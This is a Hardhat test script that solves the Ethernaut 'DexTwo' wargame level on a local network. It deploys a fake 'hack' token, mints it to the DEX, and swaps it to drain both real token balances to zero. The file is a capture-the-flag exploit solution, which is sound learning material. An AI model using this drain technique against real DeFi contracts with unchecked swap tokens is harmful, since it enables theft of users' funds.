import { expect } from "chai";
import { ethers } from "hardhat";

describe("DexTwo", function(){
	it("Should drain contract", async function(){
		// init (what ethernaut deployer do behind the scene)
		const [ deployer, player ] = await ethers.getSigners();

		const contract = await (
			await ethers.getContractFactory("DexTwo")
		).deploy();

		const token1 = await (
			await ethers.getContractFactory("SwappableTokenTwo")
		).deploy(contract.address, "Token 1", "TKN1", 110);

		const token2 = await (
			await ethers.getContractFactory("SwappableTokenTwo")
		).deploy(contract.address, "Token 2", "TKN2", 110);

		await (await token1.transfer(player.address, 10)).wait();
		await (await token2.transfer(player.address, 10)).wait();
		await (await token1.transfer(contract.address, 100)).wait();
		await (await token2.transfer(contract.address, 100)).wait();
		
		await (await contract.setTokens(token1.address, token2.address)).wait();

		console.log("Contract Token 1 balance: " + await token1.balanceOf(contract.address));
		console.log("Contract Token 2 balance: " + await token2.balanceOf(contract.address));
		console.log("player Token 1 balance: " + await token1.balanceOf(player.address));
		console.log("player Token 2 balance: " + await token2.balanceOf(player.address));
		
		// hack
		const hackToken = await (
			await ethers.getContractFactory("DexHackToken")
		).connect(player).deploy();

		// approve
		await (
			await contract.connect(player).approve(
				contract.address,
				"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
			)
		).wait();
		await (
			await hackToken.connect(player).approve(
				contract.address,
				"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
			)
		).wait();

		// mint hack tokens to dex
		await (await hackToken.connect(player).mint(contract.address, 1000)).wait();

		// swap hack tokens with token1 & token2
		const dexHackTokenBalance1 = await hackToken.balanceOf(contract.address);
		await(
			await contract.connect(player).swap(
				hackToken.address,
				token1.address,
				dexHackTokenBalance1
			)
		).wait();

		const dexHackTokenBalance2 = await hackToken.balanceOf(contract.address);
		await(
			await contract.connect(player).swap(
				hackToken.address,
				token2.address,
				dexHackTokenBalance2
			)
		).wait();

		console.log("Contract Token 1 balance: " + await token1.balanceOf(contract.address));
		console.log("Contract Token 2 balance: " + await token2.balanceOf(contract.address));
		console.log("player Token 1 balance: " + await token1.balanceOf(player.address));
		console.log("player Token 2 balance: " + await token2.balanceOf(player.address));

		// check
		expect(
			await token1.balanceOf(contract.address)
		).to.equal(0);

		expect(
			await token2.balanceOf(contract.address)
		).to.equal(0);
	})
})